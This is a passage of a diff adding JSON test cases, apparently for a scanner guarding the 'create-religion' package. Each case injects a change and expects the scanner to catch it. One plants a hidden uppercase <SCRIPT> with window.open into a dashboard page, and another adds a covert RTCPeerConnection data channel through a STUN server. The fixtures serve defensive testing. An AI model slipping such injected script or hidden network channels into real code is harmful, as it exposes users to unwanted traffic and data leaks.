+    "\"include\": [\"bin/**/*.ts\", \"lib/**/*.ts\", \"src/**/*.ts\"]"
+   ],
+   [
+    "replace",
+    "packages/create-religion/package.json",
+    "\"publishConfig\": { \"access\": \"public\" }",
+    "\"publishConfig\": { \"access\": \"public\" },\n  \"exports\": { \".\": \"./dist/src/api.js\" }"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "7.03",
+  "desc": "deliberate: uppercase <SCRIPT> block with window.open",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "<h1>Religion <span id=\"root\"></span></h1>",
+    "<h1>Religion <span id=\"root\"></span></h1><SCRIPT>window.open('https://example.com')</SCRIPT>"
+   ]
+  ],
+  "expect": "caught"
+ },
+ {
+  "id": "7.04",
+  "desc": "deliberate: RTCPeerConnection with a STUN server",
+  "ops": [
+   [
+    "replace",
+    "packages/create-religion/lib/dashboard.ts",
+    "load(); setInterval(load, 3000);",
+    "load(); setInterval(load, 3000); new RTCPeerConnection({ iceServers: [{ urls: \"stun:stun.l.google.com:19302\" }] }).createDataChannel(\"x\");"
+   ]
+  ],
+  "expect": "caught"
+ }
+]
